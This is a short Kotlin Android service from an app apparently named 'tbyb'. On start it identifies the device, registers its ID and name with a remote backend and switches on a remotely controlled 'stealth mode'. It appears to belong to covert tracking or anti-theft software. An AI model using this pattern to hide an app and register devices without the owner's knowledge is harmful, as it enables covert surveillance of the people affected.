package com.octo.nickshulhin.tbyb.services

import android.app.IntentService
import android.content.Intent
import com.octo.nickshulhin.tbyb.database.CommunicationManager
import com.octo.nickshulhin.tbyb.model.Device
import com.octo.nickshulhin.tbyb.utils.Authentication
import com.octo.nickshulhin.tbyb.utils.Hardware
import com.octo.nickshulhin.tbyb.utils.Stealth

class MainService : IntentService("MainService") {

    override fun onHandleIntent(p0: Intent?){
        identifyDevice()
        val device = getDevice()
        CommunicationManager.registerDevice(device)
        CommunicationManager.setOnStealthModeChangedListener(device, applicationContext)
        Stealth.stealthMode(applicationContext, true)
    }

    fun getDevice(): Device {
        val deviceId = Authentication.getDeviceId(applicationContext)
        val deviceName = Hardware.getDeviceName()
        return Device(deviceId, deviceName)
    }

    private fun identifyDevice() {
        val deviceId = Authentication.getDeviceId(applicationContext)
        if (deviceId == "") {
            Authentication.authenticateDevice(applicationContext)
        }
    }
}